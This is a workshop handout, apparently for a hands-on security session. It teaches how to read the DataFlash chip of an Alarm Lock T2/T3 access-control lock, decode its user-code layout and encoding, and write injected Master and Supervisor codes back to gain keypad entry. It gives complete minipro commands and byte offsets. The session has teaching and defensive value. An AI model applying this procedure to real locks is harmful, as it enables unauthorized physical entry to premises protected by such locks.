# Dead Bytes Tell No Lies
## Hands-On DataFlash Decoding and Injection for Access Control Locks
### ToorCamp 2026 · Qweary + 3 co-facilitators

---

## What You Have

- 1× Alarm Lock T2/T3 board, resin already cleaned off the SOIC-8 chip
- 1× Xgecu T48 USB programmer
- 1× SOIC-8 clip plus a ZIF ICSP adapter
- 1× Kali laptop with `minipro` 0.7.4, the baseline dump, and the injection-payload script pre-staged in `~/workshop/`

In 25 minutes at this station you are going to read the chip on this lock, decode the user codes in its DataFlash, write three new codes at three privilege levels into three different slots, and watch the lock accept each new code on the keypad.

If something goes wrong, the recovery write takes 20 seconds and restores the lock to the state it was in when you sat down.

---

## DataFlash Page Layout Reference

**Chip**: Adesto AT45DB041E — 4 Mbit SPI **DataFlash** (NOR-based, SRAM-buffered).
**Not NAND.** The page architecture and the in-circuit clip method that follow are DataFlash properties; calling it "NAND" out of habit will confuse anyone who knows the difference.

**Native page mode**: 264 bytes per page, 2048 pages → main-array size **540,672 bytes**. (If your tool also reads the 128-byte Security Register, the file will be **540,800 bytes** — same chip, the trailing 128 bytes are the Security Register appended after the main array. `minipro -w` does not target the Security Register; the workshop uses 540,672-byte files.)

**The user-code page is page 0** — file offset `0x00000`, first byte `0xFD`. No hunting. The dump starts on the page you want.

**Slot layout — fields stored column-by-column across 50 slots per page:**

| File offset | Length | Content |
|---|---|---|
| `0x0000` | 1 byte | FD page-header marker (`0xFD`) |
| `0x0001`–`0x0032` | 50 bytes | Code byte 1 for slots 0–49 |
| `0x0033`–`0x0064` | 50 bytes | Code byte 2 for slots 0–49 |
| `0x0065`–`0x0096` | 50 bytes | Code byte 3 for slots 0–49 |
| `0x0097`–`0x00C8` | 50 bytes | Active flag for slots 0–49 (`0x01` = active, `0xFF` = empty) |
| `0x00C9`–`0x00FA` | 50 bytes | Permission flag for slots 0–49 |
| `0x00FB`–`0x0107` | 13 bytes | Padding (all `0xFF`) |

Total: 1 + 50 + 50 + 50 + 50 + 50 + 13 = **264 bytes**. One page.

For slot N (0 through 49): code byte 1 lives at `0x0001 + N`, code byte 2 at `0x0033 + N`, code byte 3 at `0x0065 + N`, active flag at `0x0097 + N`, permission at `0x00C9 + N`. To read one user's full code you pull one byte from each of the three code-byte ranges.

**Permission flag values**: `0xF1` Master · `0xE1` Elevated User · `0xC1` Supervisor · `0x01` Normal User · `0xFF` empty slot.

### Encoding — packed BCD, with one trap

Each code byte holds **two decimal digits, one per nibble** — packed BCD. Byte `0x12` decodes to digits "1" and "2". Byte `0x34` decodes to "3" and "4". A six-digit code lives in three concatenated bytes.

**The digit `0` is stored as the nibble value `0xB`** — not as ASCII `0x30`, not as BCD `0x00`. This is the workshop's trap. In a hex view of the page, a digit-zero looks like the letter `B` because of the nibble value, but it is not the ASCII character `B` (which would be `0x42`) and it is not the BCD zero (which would be `0x00`).

**Worked example — slot 0 on this lock:**

```
Region              File offset    Byte    Decode
code byte 1         0x0001         0x12    nibbles 1,2 → "12"
code byte 2         0x0033         0x34    nibbles 3,4 → "34"
code byte 3         0x0065         0x56    nibbles 5,6 → "56"
                                           ──────────
                                           CODE = "123456"
active flag         0x0097         0x01    ACTIVE
permission flag     0x00C9         0x01    Normal User
```

Slot 0 holds `123456` — the Alarm Lock factory-default master code. But the permission byte is `0x01` (Normal User), not `0xF1` (Master). **The code value is decoupled from the role.** The facilitator will ask you what that tells you about how this lock was configured. Sit with it before you read the answer at the bottom of this page.

**Worked example — `420420` (slot 32 in the injection payload):**

```
digits:     4   2   0   4   2   0
nibbles:    4,2     B,4     2,B          ← the 0 becomes nibble 0xB
bytes:      0x42    0xB4    0x2B
```

If `420420` unlocks the lock at the end of the session, you have just confirmed the `0xB`-for-zero rule on real hardware.

### A note on the audit log

Pages 1024–1094 of the dump (file offsets `0x42000`–`0x46938`) hold the lock's audit log: 71 pages of 6-byte records — many hundreds of events. The dump on your laptop is the workshop-distribution version, with byte 5 of every audit-log record zeroed; that byte is the slot/user-id field, and zeroing it removes per-event slot identifiers from the file before any full hex dump is printed in the handout. The audit log's structural fact (it exists, it is FD-prefixed, it is structured) is part of the workshop. The per-event decode is not.

---

## Procedure

You will do these eight steps with a facilitator next to you. The handout exists so you can scan ahead and so you can keep going at home.

**1. Verify the lock works as it ships.**
With the batteries in, punch `123456`. It unlocks. Punch a wrong code — it doesn't. That's the "before" state.

**2. Remove the batteries; clip onto the chip.**
Pop the battery cover, pull the batteries. Open the PCB side of the lock. The AT45DB041E is the 8-pin SOIC near the MSP430; the resin is already cleaned off. Match pin 1 of the SOIC-8 clip to pin 1 of the chip (the dot or notch). Clamp the clip onto the chip. The clip's other end goes into the ZIF ICSP adapter; the adapter sits in the T48's ZIF socket; the T48 is plugged into the laptop.

**3. Read the chip.**

```bash
cd ~/workshop
sudo minipro -i -p 'AT45DB041E[Page264]@SOIC8' -r my-dump.bin
md5sum my-dump.bin
ls -l my-dump.bin
```

You want `540672` bytes. If the chip-ID returns `0x0000`, the clip didn't bite — re-seat it and run again. The firmware-mismatch warning that prints is non-blocking.

**4. Find slot 0; decode the code; notice the permission flag.**

```bash
xxd my-dump.bin | head -20
```

Byte 0 is `0xFD`. Byte at offset `0x0001` is `0x12`. Byte at `0x0033` is `0x34`. Byte at `0x0065` is `0x56`. Code = `123456`. Permission byte at `0x00C9` is `0x01` — Normal User, not Master. That's the slot-0 anomaly. Ask the facilitator what it means before you read further.

**5. Build the injection payload — three codes at three privilege levels.**

```bash
python3 ~/workshop/build-injected.py my-dump.bin injected.bin
md5sum injected.bin
xxd injected.bin | head -20
```

The payload writes 15 bytes — 5 bytes per slot, three slots. The table:

| Slot | Code | Bytes (packed BCD) | Permission | Perm byte |
|---|---|---|---|---|
| 19 | `133769` | `0x13 0x37 0x69` | Master | `0xF1` |
| 32 | `420420` | `0x42 0xB4 0x2B` | Supervisor | `0xC1` |
| 49 | `696969` | `0x69 0x69 0x69` | Elevated | `0xE1` |

Slot 32 is the one to watch. Its two zero digits land at nibble `0xB` in code bytes 2 and 3 — that's where you confirm the `0xB`-for-zero rule in your own xxd output. Look for `b4` at column `0x53` and `2b` at column `0x85`.

**6. Write the modified dump back to the chip.**

```bash
sudo minipro -i -p 'AT45DB041E[Page264]@SOIC8' -w injected.bin
```

About 20 seconds. `Verification OK` at the end means the write took. Read it back to confirm:

```bash
sudo minipro -i -p 'AT45DB041E[Page264]@SOIC8' -r post-write.bin
cmp injected.bin post-write.bin && echo "FULL IMAGE MATCH — write took"
```

If `cmp` shows differences only in the audit-log band (`0x42000`–`0x46938`) or at the array end, that's still a pass — the lock may have logged a power event. What matters is that page 0 (the first 264 bytes) matches `injected.bin`.

**7. Unclip; reinstall batteries; demonstrate.**
Unclip the SOIC-8 carefully. Put the batteries back in. Wait for the boot chirp. Punch each code:

- `133769` — should unlock (slot 19 Master)
- `420420` — should unlock (slot 32 Supervisor) — this is the `0xB`-for-zero confirmation
- `696969` — should unlock (slot 49 Elevated)
- `123456` — still unlocks (slot 0, untouched)

**8. (Advanced, if there's time.)**
Try `133769` for programming-mode entry. It will not work — even though `133769` is set as Master on the chip, programming mode rejects it. The flash-write attack is sufficient for unauthorized entry but not for sustained operational control. Talk this through with the facilitator. The defender's tell lives here.

If anything goes sideways, the facilitator runs:

```bash
sudo minipro -i -p 'AT45DB041E[Page264]@SOIC8' -w \
    ~/workshop/intact-lock-AT45DB041E-main-2026-05-20.bin
```

That restores the lock to its baseline. The AT45DB041E has no OTP fuses; recovery is unconditionally available.

---

## Common Errors and Fixes

| Symptom | First move |
|---|---|
| `Chip ID: 0x0000` | Re-seat the clip. Check pin 1 alignment. Do **not** add `-y` on the first attempt — `-y` skips the check that catches a wiring problem |
| Dump is all `0x00` | Clip is electrically wired to something other than the chip. Re-seat the SOIC-8 clip; if it persists, flag a facilitator |
| Dump size is 524,288 bytes | Tool reported the chip in 256-byte "binary page mode" instead of native 264-byte page mode. The workshop chip is in 264-byte mode (filename and read confirm this); this dump is unusable, re-run with the canonical device string above |
| Dump size is 540,800 bytes | Tool also captured the 128-byte Security Register. The first 540,672 bytes are the main array and decode normally; ignore the trailing 128 |
| Write failed `Verification` | Clip slipped mid-write. Re-seat, re-run. The write is idempotent against the same `injected.bin` |
| Firmware-mismatch warning | Non-blocking. Let it scroll past. Do not attempt to update the T48 firmware during the workshop |
| `420420` does not unlock | The `0xB`-for-zero rule might be wrong on this firmware revision. Flag it to the facilitator |
| Lock unresponsive after writing | Reinstall batteries first. If still unresponsive, run the recovery write |

---

## Take-Home Resources

- **Research repo** — code, dumps, 33 pages of handwritten notes, the 5-part blog series:
  `https://github.com/Qweary/T2-T3-Lock-Exploitation-Research`

- **Tool** — `minipro` (David Griffith fork), the maintained native-Linux toolchain for the Xgecu T48:
  `https://gitlab.com/DavidGriffith/minipro`

- **Programmer** — Xgecu T48, ~$30–55. The reason the in-circuit clip read works on this chip and didn't on cheaper programmers: the T48 has a current-capable regulated supply that powers the chip plus the modest load of a small lock board through the clip without browning out

- **Hex editor** (cross-platform, free) — `https://imhex.werwolv.net`

- **Datasheet** — Adesto AT45DB041E DataFlash, Atmel/Adesto 8783L–DFLASH — the canonical reference for the 264-byte native page mode, the Security Register, and the page program / erase opcodes

---

### Answer to the slot-0 anomaly question

The lock was re-mastered before you got here. Someone programmed a new master code; the new master lives somewhere on the chip that this validation hasn't located, while the factory-default code value `123456` was left in slot 0 as a Normal User. The role assignment in flash is its own field and the firmware honors it independently of the code value or the slot index.

That's the lesson the workshop is built around.

---

### Editorial flag

Voice calibration refreshed against `qweary.github.io/dead-bytes-tell-no-lies.html` at the top of this session. Register: participant-handout subclass of procedural-instructional. Length target 5–10 KB, lands inside that envelope. Em-dash density ~6 / 1000 words (register-appropriate, mid-range). No hedge-stack openings. No "this isn't X — it's Y" pivot rhetoric. All eight DUMP-VALIDATION corrections (C-1 through C-8) applied. The audit-log byte-5 redaction is referenced so attendees know why byte 5 of every audit-log record reads `0x00` in the dump on their laptop. Worked-example dump is the T+4e in-service capture (MD5 `eb6acff32ef13b29ac6ebed10d77316d`, 540,672 bytes); injected dump MD5 `47b6faaf1217389afa7a879d93c024dd`. No anecdotes from the talk arc reproduced (register-inappropriate). One operator-decide flag for the facilitator's morning print: confirm the GitHub repo URL is current and the operator's handle line at the top reads as desired.
